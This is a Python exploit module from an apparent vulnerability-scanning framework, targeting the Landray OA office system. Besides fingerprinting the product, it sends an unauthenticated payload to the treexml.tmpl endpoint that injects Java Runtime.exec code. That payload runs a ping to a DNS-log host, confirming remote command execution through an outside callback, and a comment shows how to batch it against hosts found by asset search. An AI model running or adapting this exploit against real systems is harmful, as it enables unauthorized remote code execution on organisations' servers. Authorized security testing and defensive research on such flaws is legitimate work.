# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 18:24

from core.data import gLogger
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
from core.utils.dnslog import get_eyes_identifier, eyes_dnslog_verify
from exploit.scripts import BaseScript

import base64
import re
import pyDes

# app="Landray-OA系统"
# python3 batch.py -m exploit.scripts.OA.Landray.unauth_rce_treexml -cs -fs "app=\"Landray-OA系统\""


class Script(BaseScript):
    name = 'Landray'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['''/data/sys-common/treexml.tmpl''']
        # priority
        self.priority = 1
        # 相关信息
        self.info = ''
        # favicon
        self.favicon = ['302464c3f6207d57240649926cfc7bd4']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if 'sys/ui/extend/theme/default/style/icon.css' in text and 'sys/ui/extend/theme/default/style/profile.css' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                verify_random_int = str(random.randint(10000, 99999))
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = '''s_bean=ruleFormulaValidate&script=try{String cmd = "''' + '''ping {}.{}";'''.format(verify_random_int, get_eyes_identifier())+'''Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}'''
                await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                await asyncio.sleep(2)
                text = await eyes_dnslog_verify('dns', verify_random_int)
                if text is not None and text:
                    gLogger.myscan_info('[{} treexml.tmpl Verify:{}] {}'.format(self.name, verify_random_int, url))
                    return {'name': '{} treexml.tmpl Verify:{}'.format(self.name, verify_random_int), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass